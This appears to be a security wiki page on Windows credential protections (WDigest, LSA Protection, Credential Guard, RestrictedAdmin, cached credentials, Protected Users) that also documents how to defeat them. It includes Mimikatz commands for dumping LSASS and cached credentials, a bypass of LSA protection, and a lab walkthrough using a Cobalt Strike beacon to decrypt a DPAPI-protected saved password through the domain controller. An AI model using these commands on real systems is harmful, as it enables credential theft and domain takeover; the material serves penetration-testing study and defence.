# Credentials Protections

## WDigest

[WDigest](https://technet.microsoft.com/pt-pt/library/cc778868\(v=ws.10\).aspx?f=255\&MSPPError=-2147217396) protocol was introduced in Windows XP and was designed to be used with HTTP Protocol for authentication. Microsoft has this protocol **enabled by default in multiple versions of Windows** (Windows XP — Windows 8.0 and Windows Server 2003 — Windows Server 2012) which means that **plain-text passwords are stored in the LSASS** (Local Security Authority Subsystem Service). **Mimikatz** can interact with the LSASS allowing an attacker to **retrieve these credentials** through the following command:

```
sekurlsa::wdigest
```

This behaviour can be **deactivated/activated setting to 1** the value of _**UseLogonCredential**_ and _**Negotiate**_ in _**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest**_.\
If these registry keys **don't exist** or the value is **"0"**, then WDigest will be **deactivated**.

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

## LSA Protection

Microsoft in **Windows 8.1 and later** has provided additional protection for the LSA to **prevent** untrusted processes from being able to **read its memory** or to inject code. This will prevent regular `mimikatz.exe sekurlsa:logonpasswords` for working properly.\
To **activate this protection** you need to set the value _**RunAsPPL**_ in _**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\LSA**_ to 1.

```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```

### Bypass

It is possible to bypass this protection using Mimikatz driver mimidrv.sys:

![.gitbook/assets/1664530484\_2839.png](../../.gitbook/assets/mimidrv.png)

### Crendential manager

The credential manager blobs are stored in the user's `AppData` directory.

```
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 372b     fil     02/25/2021 13:07:38   9D54C839752B38B233E5D56FDD7891A7
 10kb     fil     02/21/2021 11:49:40   DFBE70A7E5CC19A398EBF1B96859CE5D
```

The native `vaultcmd` tool can also be used to list them.

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/srv-1
Identity: DEV\bfarmer
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

Or `mimikatz vault::list`.

```
beacon> mimikatz vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
    Name       : Web Credentials
    Path       : C:\Users\bfarmer\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
    Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
    Name       : Windows Credentials
    Path       : C:\Users\bfarmer\AppData\Local\Microsoft\Vault
    Items (1)
      0.    (null)
        Type            : {3e0e35be-1b77-43e7-b873-aed901b6275b}
        LastWritten     : 2/25/2021 1:07:38 PM
        Flags           : 00000000
        Ressource       : [STRING] Domain:target=TERMSRV/srv-1
        Identity        : [STRING] DEV\bfarmer
        Authenticator   : 
        PackageSid      : 
        *Authenticator* : [BYTE*] 

        *** Domain Password ***
```

If you go to the **Control Panel > Credential Manager** on WKSTN-1 and select **Windows Credentials**, you will see how this credential appears to the user. And opening the **Remote Desktop Connection** client shows how these creds are automatically populated for the target server.

![.gitbook/assets/1664530484\_2839.png](https://rto-assets.s3.eu-west-2.amazonaws.com/dpapi/cred-manager.png)

To decrypt the credential, we need to find the master encryption key.

First, run `dpapi::cred` and provide the location to the blob on disk.

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7

**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {a23a1631-e2ca-4805-9f2f-fe8966fd8698}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : f8fb8d0f5df3f976e445134a2410ffcd
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : e8ae77b9f12aef047664529148beffcc
  dwDataLen          : 000000b0 - 176
  pbData             : b8f619[...snip...]b493fe
  dwSignLen          : 00000014 - 20
  pbSign             : 2e12c7baddfa120e1982789f7265f9bb94208985
```

The **pbData** field contains the encrypted data and the **guidMasterKey** contains the GUID of the key needed to decrypt it. The Master Key information is stored within the user's `AppData\Roaming\Microsoft\Protect` directory (where `S-1-5-21-*` is their SID).

```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     02/21/2021 11:49:40   a23a1631-e2ca-4805-9f2f-fe8966fd8698
 928b     fil     02/21/2021 11:49:40   BK-DEV
 24b      fil     02/21/2021 11:49:40   Preferred
```

Notice how this filename **a23a1631-e2ca-4805-9f2f-fe8966fd8698** matches the **guidMasterKey** field above.

There are a few ways to get the actual Master Key content. If you have access to a high integrity session, you may be able to dump it from memory using `sekurlsa::dpapi`. However it may not always be cached here and this interacts with LSASS which is not ideal for OPSEC. My preferred method is to use the RPC service exposed on the Domain Controller, which is a "legitimate" means (as in, by design and using legitimate RPC traffic).

Run `mimikatz dpapi::masterkey`, provide the path to the Master Key information and specify `/rpc`.

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
  sha1: e3d7a52f1755a35078736eecb5ea6a23bb8619fc
```

The **key** field is the key needed to decrypt the credential, which we can do with `dpapi::cred`.

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df

Decrypting Credential:
 [...snip...]
  UserName       : DEV\bfarmer
  CredentialBlob : Sup3rman
```

In this case bfarmer is a local admin on SRV-1, so they just have their own domain credentials saved. It's worth noting that even if they had local credentials or even a different set of domain credentials saved, the process to decrypt them would be exactly the same.

## Credential Guard

**Credential Guard** is a new feature in Windows 10 (Enterprise and Education edition) that helps to protect your credentials on a machine from threats such as pass the hash. This works through a technology called Virtual Secure Mode (VSM) which utilizes virtualization extensions of the CPU (but is not an actual virtual machine) to provide **protection to areas of memory** (you may hear this referred to as Virtualization Based Security or VBS). VSM creates a separate "bubble" for key **processes** that are **isolated** from the regular **operating system** processes, even the kernel and **only specific trusted processes may communicate to the processes** (known as **trustlets**) in VSM. This means a process in the main OS cannot read the memory from VSM, even kernel processes. The **Local Security Authority (LSA) is one of the trustlets** in VSM in addition to the standard **LSASS** process that still runs in the main OS to ensure support with existing processes but is really just acting as a proxy or stub to communicate with the version in VSM ensuring actual credentials run on the version in VSM and are therefore protected from attack. Credential Guard must be turned on and deployed in your organization as it is **not enabled by default.**\
From [https://www.itprotoday.com/windows-10/what-credential-guard](https://www.itprotoday.com/windows-10/what-credential-guard)\
More information and a PS1 script to enable Credential Guard [can be found here](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage).

In this case **Mimikatz cannot do much to bypass** this and extract the hashes from LSASS. But you could always add your **custom SSP** and **capture the credentials** when a user tries to login in **clear-text**.\
More information about [**SSP and how to do this here**](../active-directory-methodology/custom-ssp.md).

Credentials Guard could be **enable in different ways**. To check if it was enabled using the registry you could check the value of the key _**LsaCfgFlags**_ in _**HKLM\System\CurrentControlSet\Control\LSA**_. If the value is **"1"** the it is active with UEFI lock, if **"2"** is active without lock and if **"0"** it's not enabled.\
This is **not enough to enable Credentials Guard** (but it's a strong indicator).\
More information and a PS1 script to enable Credential Guard [can be found here](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage).

```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```

## RDP RestrictedAdmin Mode

With Windows 8.1 and Windows Server 2012 R2, new security features were introduced. One of those security features is the _Restricted Admin mode for RDP_. This new security feature is introduced to mitigate the risk of [pass the hash](https://blog.ahasayen.com/pass-the-hash/) attacks.

When you connect to a remote computer using RDP, your credentials are stored on the remote computer that you RDP into. Usually you are using a powerful account to connect to remote servers, and having your credentials stored on all these computers is a security threat indeed.

Using _Restricted Admin mode for RDP_, when you connect to a remote computer using the command, **mstsc.exe /RestrictedAdmin**, you will be authenticated to the remote computer, but **your credentials will not be stored on that remote computer**, as they would have been in the past. This means that if a malware or even a malicious user is active on that remote server, your credentials will not be available on that remote desktop server for the malware to attack.

Note that as your credentials are not being saved on the RDP session if **try to access network resources** your credentials won't be used. **The machine identity will be used instead**.

![.gitbook/assets/1664530484\_2839.png](../../.gitbook/assets/ram.png)

From [here](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/).

## Cached Credentials

**Domain credentials** are used by operating system components and are **authenticated** by the **Local** **Security Authority** (LSA). Typically, domain credentials are established for a user when a registered security package authenticates the user's logon data. This registered security package may be the **Kerberos** protocol or **NTLM**.

**Windows stores the last ten domain login credentials in the event that the domain controller goes offline**. If the domain controller goes offline, a user will **still be able to log into their computer**. This feature is mainly for laptop users that do not regularly log into their company’s domain. The number of credentials that the computer stores can be controlled by the following **registry key, or via group policy**:

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

The credentials are hidden from normal users, even administrator accounts. The **SYSTEM** user is the only user that has **privileges** to **view** these **credentials**. In order for an administrator to view these credentials in the registry they must access the registry as a SYSTEM user.\
The Cached credentials are stored in the registry at the following registry location:

```
HKEY_LOCAL_MACHINE\SECURITY\Cache
```

**Extracting from Mimikatz**: `lsadump::cache`\
From [here](http://juggernaut.wikidot.com/cached-credentials).

## key.aes + secret.aes

```powershell
$username = "Username"
$GetKey = Get-Content "C:\users\thalpius\downloads\key.aes"
$EncryptedPasswordFile = "C:\users\thalpius\downloads\secrets.aes"
$SecureStringPassword = Get-Content -Path $EncryptedPasswordFile | ConvertTo-
SecureString -Key $GetKey
$Credential = New-Object -TypeName System.Management.Automation.PSCredential
-ArgumentList $username,$SecureStringPassword
$Credential.GetNetworkCredential().Password
```

## Protected Users

When the signed in user is a member of the Protected Users group the following protections are applied:

* Credential delegation (CredSSP) will not cache the user's plain text credentials even when the **Allow delegating default credentials** Group Policy setting is enabled.
* Beginning with Windows 8.1 and Windows Server 2012 R2, Windows Digest will not cache the user's plain text credentials even when Windows Digest is enabled.
* **NTLM** will **not cache** the user's **plain text credentials** or NT **one-way function** (NTOWF).
* **Kerberos** will **no** longer create **DES** or **RC4 keys**. Also it will **not cache the user's plain text** credentials or long-term keys after the initial TGT is acquired.
* A **cached verifier is not created at sign-in or unlock**, so offline sign-in is no longer supported.

After the user account is added to the Protected Users group, protection will begin when the user signs in to the device. **From** [**here**](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)**.**

| Windows Server 2003 RTM | Windows Server 2003 SP1+ | <p>Windows Server 2012,<br>Windows Server 2008 R2,<br>Windows Server 2008</p> | Windows Server 2016          |
| ----------------------- | ------------------------ | ----------------------------------------------------------------------------- | ---------------------------- |
| Account Operators       | Account Operators        | Account Operators                                                             | Account Operators            |
| Administrator           | Administrator            | Administrator                                                                 | Administrator                |
| Administrators          | Administrators           | Administrators                                                                | Administrators               |
| Backup Operators        | Backup Operators         | Backup Operators                                                              | Backup Operators             |
| Cert Publishers         |                          |                                                                               |                              |
| Domain Admins           | Domain Admins            | Domain Admins                                                                 | Domain Admins                |
| Domain Controllers      | Domain Controllers       | Domain Controllers                                                            | Domain Controllers           |
| Enterprise Admins       | Enterprise Admins        | Enterprise Admins                                                             | Enterprise Admins            |
|                         |                          |                                                                               | Enterprise Key Admins        |
|                         |                          |                                                                               | Key Admins                   |
| Krbtgt                  | Krbtgt                   | Krbtgt                                                                        | Krbtgt                       |
| Print Operators         | Print Operators          | Print Operators                                                               | Print Operators              |
|                         |                          | Read-only Domain Controllers                                                  | Read-only Domain Controllers |
| Replicator              | Replicator               | Replicator                                                                    | Replicator                   |
| Schema Admins           | Schema Admins            | Schema Admins                                                                 | Schema Admins                |
| Server Operators        | Server Operators         | Server Operators                                                              | Server Operators             |

**Table from** [**here**](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)**.**
